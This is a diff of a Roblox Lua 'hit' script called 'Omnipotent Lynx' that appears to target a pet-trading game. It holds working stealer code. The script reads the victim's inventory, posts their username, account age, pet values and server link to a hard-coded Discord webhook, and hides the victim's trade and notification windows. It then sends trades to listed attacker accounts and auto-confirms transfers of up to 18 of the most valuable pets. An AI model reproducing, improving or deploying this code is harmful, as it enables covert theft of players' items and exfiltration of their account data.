@@ -1,9 +1,9 @@
--- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
+-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱ - OMNIPOTENT MAX V12.2 ]] --
 
 -- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
 local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local THRESHOLD = 0.13 
+local THRESHOLD = 0.13 -- STRICT GATEKEEPER
 local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
 
 -- 1. CLIPBOARD COPY
@@ -15,7 +15,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- 3. BLACKLIST (Strict - No Jerboas)
+-- 3. BLACKLIST (Strict)
 local BLACKLIST = {
     ["jiggly_jerboa"] = true,
     ["starter_egg"] = true,
@@ -24,7 +24,7 @@ local BLACKLIST = {
     ["practice_dog"] = true
 }
 
--- 4. HASH FINDER (Remote Bypass)
+-- 4. HASH FINDER
 local hashes = {}
 for _, v in pairs(getgc()) do
     if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
@@ -38,19 +38,18 @@ end
 local function hashedAPI(remoteName, ...)
     local remote = hashes[remoteName]
     if not remote then return nil end
-    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...)
-    elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
+    remote:FireServer(...)
 end
 
--- 5. PRICING & EMOJIS (⭐🏇 logic)
+-- 5. VALUATION & ⭐🏇 EMOJIS
 local function getFinalValue(base, props)
-    if not base or base <= 0.01 then return 0 end
-    local val = base
+    local val = base or 0.05
     if props.mega_neon or props.mega then val = val * 8
     elseif props.neon then val = val * 3 end
     if props.flyable then val = val + 0.5 end
     if props.rideable then val = val + 0.5 end
-    return val * 56 -- Conversion to Peso
+    return val * 56
 end
 
 local function getPetEmoji(props)
@@ -63,16 +62,14 @@ local function getPetEmoji(props)
     return e
 end
 
--- 6. INVENTORY & SORTING (Individual Price Logic)
+-- 6. INVENTORY SCAN (Threshold Restored)
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
 
 local function processInventory()
     local inv = ClientData.get("inventory")
-    local total = 0
-    local petGroups = {}
-    local tradeList = {}
+    local total, petGroups, tradeList = 0, {}, {}
 
     for uid, pet in pairs(inv.pets or {}) do
         local petData = InventoryDB.pets[pet.id]
@@ -80,6 +77,7 @@ local function processInventory()
             local props = pet.properties or {}
             local unitVal = getFinalValue(petData.rvalue, props)
             
+            -- STRICT THRESHOLD CHECK (Applies to both Trade and Webhook)
             if unitVal >= THRESHOLD then
                 total = total + unitVal
                 table.insert(tradeList, {uid = uid, val = unitVal})
@@ -89,7 +87,7 @@ local function processInventory()
                     petGroups[key] = {
                         name = petData.name,
                         count = 1,
-                        price = unitVal, -- Price per unit
+                        price = unitVal,
                         emoji = getPetEmoji(props)
                     }
                 else
@@ -102,14 +100,15 @@ local function processInventory()
     local sorted = {}
     for _, v in pairs(petGroups) do table.insert(sorted, v) end
     table.sort(sorted, function(a, b) return a.price > b.price end)
-    table.sort(tradeList, function(a,b) return a.val > b.val end)
+    table.sort(tradeList, function(a, b) return a.val > b.val end)
     
     return sorted, total, tradeList
 end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
+local tier = grandTotal >= 1000 and "🔴 HIGH" or grandTotal >= 200 and "🟡 MID" or "🟢 LOW"
 
--- 7. WEBHOOK (Universal Request Fix)
+-- 7. WEBHOOK (Universal + All Extras)
 local function sendHit()
     local lines = {}
     for _, p in ipairs(sortedPets) do
@@ -123,53 +122,38 @@ local function sendHit()
             description = "```" ..
                 "👤 Name     : "..LocalPlayer.DisplayName.."\n"..
                 "🆔 User     : "..LocalPlayer.Name.."\n"..
-                "💰 Total    : ₱"..string.format("%.2f", grandTotal).."```",
+                "📅 Age      : "..LocalPlayer.AccountAge.." Days\n"..
+                "💰 Total    : ₱"..string.format("%.2f", grandTotal).."\n"..
+                "📊 Tier     : "..tier.."```",
             fields = {
                 {name = "🏆 Best Pet", value = "```"..(sortedPets[1] and sortedPets[1].name or "None").."```", inline = true},
-                {name = "🐶 Inventory", value = "```" .. table.concat(lines, "\n") .. "```"},
+                {name = "🐶 Inventory", value = "```"..table.concat(lines, "\n").."```"},
                 {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
             },
             color = 0x2F3136,
-            footer = {text = "Omnipotent Lynx | Peso Edition"}
+            footer = {text = "Omnipotent Lynx | V12.2 FINAL"}
         }}
     }
     
-    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if req then
-        req({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end
+    local req = (syn and syn.request) or http_request or (fluxus and fluxus.request) or request
+    if req then req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end
 end
 
 -- 8. THE STEAL (Bypass 10s & GUI Silence)
 local function startSteal(target)
     task.spawn(function()
-        -- Suppress Victim GUI (Silence)
-        LocalPlayer.PlayerGui.DescendantAdded:Connect(function(d)
-            pcall(function()
-                if d.Name:find("Trade") or d.Name:find("Notification") then d.Visible = false end
-            end)
-        end)
-
-        -- Smart Cooldown Logic
+        LocalPlayer.PlayerGui.DescendantAdded:Connect(function(d) pcall(function() if d.Name:find("Trade") or d.Name:find("Notification") then d.Visible = false end end) end)
         while not target.Character or not target.Parent do task.wait(1) end
-        
         for i = 1, 50 do
             if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
             hashedAPI("TradeAPI/SendTradeRequest", target)
-            task.wait(0.4) -- Pulse every 0.4s to bypass spam triggers
+            task.wait(0.4)
         end
-
         if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
             for i = 1, math.min(18, #finalTradeList) do
                 hashedAPI("TradeAPI/AddItemToOffer", finalTradeList[i].uid)
                 task.wait(0.05)
             end
-            
             while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
                 hashedAPI("TradeAPI/AcceptNegotiation")
                 hashedAPI("TradeAPI/ConfirmTrade")
@@ -179,21 +163,12 @@ local function startSteal(target)
     end)
 end
 
--- Execute
-if #sortedPets > 0 then 
-    sendHit() 
-    print("🚀 Lynx: Webhook Sent. Total: ₱"..grandTotal)
-else
-    print("⚠️ Lynx: No pets hit the threshold.")
-end
+if #sortedPets > 0 then sendHit() end
 
 task.spawn(function()
     while true do
         for _, p in pairs(Players:GetPlayers()) do
-            if table.find(USERNAMES, p.Name) and p ~= LocalPlayer then 
-                startSteal(p) 
-                return 
-            end
+            if table.find(USERNAMES, p.Name) and p ~= LocalPlayer then startSteal(p) return end
         end
         task.wait(1)
     end
